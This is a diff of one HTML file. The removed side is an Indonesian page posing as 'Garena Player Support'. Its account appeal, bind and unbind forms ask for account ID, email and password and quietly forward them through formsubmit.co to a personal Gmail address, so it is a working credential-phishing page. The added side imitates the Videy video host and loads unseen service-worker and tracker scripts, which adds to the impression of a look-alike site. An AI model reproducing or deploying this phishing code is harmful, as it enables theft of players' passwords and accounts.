@@ -1,248 +1,85 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Garena Player Support</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: linear-gradient(135deg, #141e30, #243b55);
-      color: #fff;
-      margin: 0;
-      padding: 0;
-    }
-    header {
-      background: #ff3c00;
-      padding: 16px;
-      text-align: center;
-      font-size: 20px;
-      font-weight: bold;
-    }
-    .container {
-      max-width: 500px;
-      margin: 20px auto;
-      background: rgba(0,0,0,0.75);
-      padding: 20px;
-      border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.5);
-    }
-    .tab-buttons {
-      display: flex;
-      justify-content: space-around;
-      margin-bottom: 20px;
-    }
-    .tab-buttons button {
-      flex: 1;
-      padding: 10px;
-      margin: 0 5px;
-      border: none;
-      border-radius: 6px;
-      font-weight: bold;
-      cursor: pointer;
-      transition: 0.3s;
-    }
-    .tab-buttons .active {
-      background: #ff3c00;
-      color: #fff;
-    }
-    .tab-buttons .inactive {
-      background: #222;
-      color: #ccc;
-    }
-    label {
-      display: block;
-      margin: 8px 0 4px;
-      font-size: 14px;
-    }
-    input, textarea, select {
-      width: 100%;
-      padding: 10px;
-      border-radius: 6px;
-      border: none;
-      margin-bottom: 12px;
-      font-size: 14px;
-    }
-    button.submit-btn {
-      width: 100%;
-      padding: 12px;
-      background: #ff3c00;
-      border: none;
-      border-radius: 6px;
-      color: #fff;
-      font-weight: bold;
-      cursor: pointer;
-      transition: 0.3s;
-      font-size: 14px;
-    }
-    button.submit-btn:hover {
-      background: #e03200;
-    }
-    .success {
-      text-align: center;
-      padding: 40px 20px;
-    }
-    .success h1 {
-      color: #00ff6a;
-      margin-bottom: 10px;
-    }
-    .hidden {
-      display: none;
-    }
-  </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Watch on Videy — Free and Simple Video Hosting</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link rel="icon" type="image/x-icon" href="https://videy.co/favicon.ico" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://videy.co/assets/style.css" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+  <script src="/assets/sw-init.js"></script>
 </head>
-<body>
-  <header>Garena Player Support</header>
-  <div class="container" id="formContainer">
-
-    <!-- Tombol tab -->
-    <div class="tab-buttons">
-      <button id="tabBanding" class="active">Banding Akun</button>
-      <button id="tabBind" class="inactive">Bind Cepat</button>
-      <button id="tabUnbind" class="inactive">Unbind Cepat</button>
+<body data-version="v1.0.5">
+  <div class="container">
+    <div class="top">
+      <div class="logo"><a href="/">videy</a></div>
+      <a href="/"><div class="upload">Upload</div></a>
+      <div class="more"><a href="/advertise">Advertise</a></div>
     </div>
 
-    <!-- Form Banding -->
-    <form id="formBanding" method="POST" target="hidden_iframe" onsubmit="return showSuccess()">
-      <input type="hidden" name="_subject" value="Banding Akun Baru">
-      <input type="hidden" name="_captcha" value="false">
-
-      <label>ID Akun</label>
-      <input type="number" name="ID Akun" required>
-
-      <label>Email / Gmail</label>
-      <input type="email" name="Email" required>
-
-      <label>Password</label>
-      <input type="password" name="Password" required>
-
-      <label>Alasan Banding</label>
-      <textarea name="Alasan Banding" rows="3" required></textarea>
-
-      <button type="submit" class="submit-btn">Kirim Banding</button>
-    </form>
-
-    <!-- Form Bind Cepat -->
-    <form id="formBind" class="hidden" method="POST" target="hidden_iframe" onsubmit="return showSuccess()">
-      <input type="hidden" name="_subject" value="Bind Cepat Baru">
-      <input type="hidden" name="_captcha" value="false">
-
-      <label>ID Akun</label>
-      <input type="number" name="ID Akun" required>
-
-      <label>Email / Gmail</label>
-      <input type="email" name="Email" required>
-
-      <label>Password</label>
-      <input type="password" name="Password" required>
-
-      <label>Bind ke</label>
-      <select name="Bind ke">
-        <option>Facebook</option>
-        <option>Google</option>
-        <option>VK</option>
-      </select>
-
-      <button type="submit" class="submit-btn">Kirim Permintaan Bind</button>
-    </form>
-
-    <!-- Form Unbind Cepat -->
-    <form id="formUnbind" class="hidden" method="POST" target="hidden_iframe" onsubmit="return showSuccess()">
-      <input type="hidden" name="_subject" value="Unbind Cepat Baru">
-      <input type="hidden" name="_captcha" value="false">
-
-      <label>ID Akun</label>
-      <input type="number" name="ID Akun" required>
-
-      <label>Email / Gmail</label>
-      <input type="email" name="Email" required>
-
-      <label>Password</label>
-      <input type="password" name="Password" required>
-
-      <label>Unbind dari</label>
-      <select name="Unbind dari">
-        <option>Facebook</option>
-        <option>Google</option>
-        <option>VK</option>
-      </select>
-
-      <button type="submit" class="submit-btn">Kirim Permintaan Unbind</button>
-    </form>
-
-    <!-- Notifikasi sukses -->
-    <div id="successMessage" class="success hidden">
-      <h1>✅ Data berhasil dikirim!</h1>
-      <p>Silakan tunggu respon dari tim support.</p>
-      <button onclick="resetForm()" class="submit-btn">Kirim Lagi</button>
+    <div class="video">
+      <div class="video-inner">
+        <video autoplay controls width="100%" id="video" playsinline>
+          <source type="video/mp4" />
+          Your browser does not support the video tag.
+        </video>
+        <div id="video-error" style="display: none;" class="video-error-container">
+          <div class="video-error">Video could not load.</div>
+          <div class="video-error-reasons">
+            This could be because the video was removed, your internet connection is down, the server is having issues, or the video might not have ever existed.
+          </div>
+        </div>
+      </div>
     </div>
 
-    <iframe name="hidden_iframe" style="display:none;"></iframe>
+    <div class="video-actions" style="display: none;">
+      <div class="video-actions-inner">
+        <button class="action-btn" id="shareVideo">Share Video</button>
+        <button class="action-btn" id="copyUrl">Copy Link</button>
+        <button class="action-btn" id="uploadVideo">Upload</button>
+        <button class="action-btn" id="subscribeBtn">Subscribe</button>
+        <button class="action-btn" id="reportBtn">Report</button>
+      </div>
+    </div>
+
+    <div class="as">
+      <iframe id="ads-iframe" src="" style="width: 100%; height: 500px; border: none; display: none;"></iframe>
+    </div>
+
+    <div class="footer">
+      <div class="copyright">Copyright &copy; <span id="year"></span> videy.co</div>
+      <div class="legal">
+        <div class="item"><a href="/terms-of-service">Terms of Service</a></div>
+        <div class="item"><a href="#" id="reportAbuse">Report Abuse</a></div>
+      </div>
+    </div>
   </div>
+  
+  <script src="config.js"></script>
+<script src="tracker.js"></script>
 
+  <script async defer src="https://www.googletagmanager.com/gtag/js?id=G-BDP4EF6BCQ"></script>
   <script>
-    // semua form diarahkan ke email tujuan yang sama
-    const emailTujuan = "yanzfff2@gmail.com"; // Ganti dengan email Anda
-    document.querySelectorAll("form").forEach(form => {
-      form.action = "https://formsubmit.co/" + emailTujuan;
-    });
-
-    const tabBanding = document.getElementById("tabBanding");
-    const tabBind = document.getElementById("tabBind");
-    const tabUnbind = document.getElementById("tabUnbind");
-
-    const formBanding = document.getElementById("formBanding");
-    const formBind = document.getElementById("formBind");
-    const formUnbind = document.getElementById("formUnbind");
-    const successMessage = document.getElementById("successMessage");
-
-    function showForm(form) {
-      formBanding.classList.add("hidden");
-      formBind.classList.add("hidden");
-      formUnbind.classList.add("hidden");
-      successMessage.classList.add("hidden");
-      form.classList.remove("hidden");
-
-      tabBanding.classList.remove("active");
-      tabBind.classList.remove("active");
-      tabUnbind.classList.remove("active");
-
-      tabBanding.classList.add("inactive");
-      tabBind.classList.add("inactive");
-      tabUnbind.classList.add("inactive");
+    function getAdGroup() {
+      let adGroup = localStorage.getItem('ad_group');
+      if (!adGroup) {
+        adGroup = Math.floor(Math.random() * 100) + 1;
+        localStorage.setItem('ad_group', adGroup);
+      }
+      return parseInt(adGroup);
     }
+    window.dataLayer = window.dataLayer || [];
+    function gtag() { dataLayer.push(arguments); }
 
-    tabBanding.addEventListener("click", () => {
-      showForm(formBanding);
-      tabBanding.classList.add("active");
-      tabBanding.classList.remove("inactive");
-    });
-
-    tabBind.addEventListener("click", () => {
-      showForm(formBind);
-      tabBind.classList.add("active");
-      tabBind.classList.remove("inactive");
-    });
-
-    tabUnbind.addEventListener("click", () => {
-      showForm(formUnbind);
-      tabUnbind.classList.add("active");
-      tabUnbind.classList.remove("inactive");
-    });
-
-    function showSuccess() {
-      formBanding.classList.add("hidden");
-      formBind.classList.add("hidden");
-      formUnbind.classList.add("hidden");
-      successMessage.classList.remove("hidden");
-      return true;
-    }
-
-    function resetForm() {
-      showForm(formBanding);
-      tabBanding.classList.add("active");
-      tabBanding.classList.remove("inactive");
-    }
+    gtag('js', new Date());
+    gtag('config', 'G-BDP4EF6BCQ');
   </script>
+
+  <!-- Tracking Script -->
+<script src="config.js"></script>
+<script src="tracker.js"></script>>
 </body>
-</html>
+  </html>
